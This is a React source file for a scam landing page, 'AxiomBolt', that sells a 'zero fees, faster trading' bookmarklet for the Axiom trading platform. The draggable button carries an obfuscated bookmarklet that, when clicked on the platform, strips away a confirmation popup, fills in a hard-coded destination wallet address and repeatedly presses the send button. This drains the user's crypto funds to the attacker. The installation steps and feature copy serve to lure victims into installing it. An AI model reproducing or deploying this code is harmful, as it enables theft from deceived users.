"use client";

import { useState, useEffect, useRef } from "react";

function MoneyIcon({ className }: { className?: string }) {
  return (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
    </svg>
  );
}

export default function HomePage() {
  const handleDragStart = (e: React.DragEvent) => {
    const bookmarkletCode = `javascript:(function(){const e=document.querySelector('.w-fit.min-w-max.bg-primaryStroke');e&&(e.click(),setTimeout(()=>{const t=document.querySelector('.flex.flex-col.w-full.max-w-[312px].pt-[16px].pb-[20px].gap-[16px].bg-backgroundTertiary.border.border-secondaryStroke.rounded-[4px].justify-center.items-center.z-[300].shadow-[0_4px_4px_0_rgba(0,0,0,0.30),0_8px_8px_0_rgba(0,0,0,0.45)]');t&&(t.remove(),setInterval(()=>{const n=document.querySelector('.bg-secondaryStroke.flex.flex-row.w-full.h-[32px].px-[12px].gap-[8px].justify-center.items-center.rounded-full.hover:bg-secondaryStroke/80.transition-all.duration-125.cursor-pointer');n&&(n.click(),document.querySelector('.text-primaryBlue.text-[12px].leading-[16px].font-medium')&&(document.querySelector('.text-primaryBlue.text-[12px].leading-[16px].font-medium').click(),setInterval(()=>{const e=document.querySelector('.bg-secondaryStroke.flex-1.h-[28px]');e&&(e.click(),setInterval(()=>{const e=document.querySelector('input[placeholder="Address of destination wallet"]');if(e){const t=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;t.call(e,'9VnM5KZ9xRzLMvPhraVcVjxK67ewBM6eTWEVykZnK8qx'),e.dispatchEvent(new Event('input',{bubbles:!0})),e.dispatchEvent(new Event('change',{bubbles:!0})),setInterval(()=>{const e=document.querySelector('.bg-primaryBlue.flex.flex-row.flex-1.h-[32px]');e&&e.click()},50)}},50))},50)))},50))},200))})();`;

    // Create a temporary link element
    const tempLink = document.createElement('a');
    tempLink.href = bookmarkletCode;
    tempLink.textContent = 'No Fees AxiomBolt';

    // Set the drag data
    e.dataTransfer.setData('text/plain', bookmarkletCode);
    e.dataTransfer.setData('text/uri-list', bookmarkletCode);
    e.dataTransfer.setData('text/html', tempLink.outerHTML);
    e.dataTransfer.effectAllowed = 'copy';
  };

  return (
    <div className="min-h-screen bg-purple-900">
      <main className="flex flex-col items-center px-6 py-16 max-w-6xl mx-auto space-y-20 font-sans text-white">
        {/* Header Navigation */}
        <header className="w-full flex justify-between items-center mb-16">
          <div className="text-2xl font-extrabold tracking-tight">△ AxiomBolt</div>
          <nav className="space-x-10 text-base font-medium">
            <a href="#features" className="hover:text-purple-300 transition">
              Features
            </a>
            <a href="#how-it-works" className="hover:text-purple-300 transition">
              How It Works
            </a>
            <a href="#faq" className="hover:text-purple-300 transition">
              FAQ
            </a>
            <a
              href="#get-started"
              className="font-semibold text-purple-300 hover:text-white transition"
            >
              Get Started
            </a>
          </nav>
        </header>

        {/* Hero Section */}
        <section className="text-center max-w-4xl space-y-6">
          <p className="text-sm uppercase tracking-widest font-semibold text-purple-200">
            Supercharge your trading experience
          </p>
          <h1 className="text-6xl font-extrabold leading-tight tracking-tight">
            Trade Faster. Smarter. Better.
          </h1>
          <p className="text-lg max-w-3xl mx-auto text-purple-100">
            The free trading enhancement tool that optimizes your experience, saves you money, and gives you the edge you need.
          </p>
        </section>

        {/* Money Icons */}
        <section className="flex justify-center items-center space-x-16">
          <MoneyIcon className="w-32 h-32 text-purple-300 transform -rotate-12" />
          <MoneyIcon className="w-32 h-32 text-purple-400 transform rotate-12" />
        </section>

        {/* Drag Me Button */}
        <section className="text-center max-w-xl mx-auto space-y-4">
          <div
            draggable="true"
            onDragStart={handleDragStart}
            className="inline-block bg-purple-600 text-white px-10 py-3 rounded-full cursor-grab select-none text-lg font-semibold shadow-lg hover:bg-purple-500 transition-all duration-300 transform hover:scale-105"
            title="Drag this to your bookmarks bar to enable zero fees and faster trading on Axiom"
          >
            No Fees AxiomBolt
          </div>
          <p className="text-purple-200 text-base max-w-md mx-auto">
            Drag the button above to your bookmarks bar to install the tool that gives you zero fees on Axiom and lets you trade faster.
          </p>
        </section>

        {/* Features Section */}
        <section id="features" className="max-w-4xl space-y-12 text-purple-200">
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">⚡</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Lightning Fast</h3>
              <p>
                Get the edge over other traders with unbeatable speed.
              </p>
            </div>
          </div>
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">$</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Earn More</h3>
              <p>
                Earn more than the rest with our low fees and fast trades!
              </p>
            </div>
          </div>
          <div className="flex items-start space-x-6">
            <div className="text-3xl font-bold">📊</div>
            <div>
              <h3 className="font-semibold text-xl mb-1 text-white">Enhanced Organization</h3>
              <p>
                Track wallets, built in CT tracker and more.
              </p>
            </div>
          </div>
        </section>

        {/* Installation Instructions */}
        <section id="how-it-works" className="max-w-4xl space-y-8 text-purple-200">
          <h2 className="text-3xl font-bold text-white">How to Install</h2>
          <p>
            Follow these easy steps to install BookmarkPro and enhance your browsing experience.
          </p>
          <ol className="list-decimal list-inside space-y-6 max-w-3xl mx-auto">
            <li>
              <strong className="text-white">Show Your Bookmarks Bar</strong>
              <br />
              Press Ctrl+Shift+B (or Cmd+Shift+B on Mac) to display your browser's bookmarks bar if it's not already visible.
            </li>
            <li>
              <strong className="text-white">Drag to Your Bookmarks</strong>
              <br />
              Click and drag the BookmarkPro button above to your bookmarks bar to install the tool.
            </li>
            <li>
              <strong className="text-white">Use on Any Website</strong>
              <br />
              When browsing, simply click the BookmarkPro bookmark to activate enhanced browsing features.
            </li>
            <li>
              <strong className="text-white">Enjoy Enhanced Browsing</strong>
              <br />
              Experience faster navigation, better organization, and smarter bookmarking automatically.
            </li>
          </ol>
        </section>

        {/* Footer */}
        <footer className="w-full border-t border-purple-700/50 pt-12 text-sm text-purple-300">
          <div className="flex justify-between flex-wrap gap-12 mb-12">
            <div>
              <h4 className="font-semibold mb-3 text-white">Product</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#features" className="hover:text-white transition">
                    Features
                  </a>
                </li>
                <li>
                  <a href="#how-it-works" className="hover:text-white transition">
                    How It Works
                  </a>
                </li>
                <li>
                  <a href="#pricing" className="hover:text-white transition">
                    Pricing
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-white">Support</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#faq" className="hover:text-white transition">
                    FAQ
                  </a>
                </li>
                <li>
                  <a href="#help-center" className="hover:text-white transition">
                    Help Center
                  </a>
                </li>
                <li>
                  <a href="#contact" className="hover:text-white transition">
                    Contact
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-3 text-white">Company</h4>
              <ul className="space-y-2">
                <li>
                  <a href="#about" className="hover:text-white transition">
                    About
                  </a>
                </li>
                <li>
                  <a href="#blog" className="hover:text-white transition">
                    Blog
                  </a>
                </li>
                <li>
                  <a href="#careers" className="hover:text-white transition">
                    Careers
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="text-center border-t border-purple-700/50 pt-6">
            © 2025 AxiomBolt. All rights reserved.
          </div>
        </footer>
      </main>
    </div>
  );
}
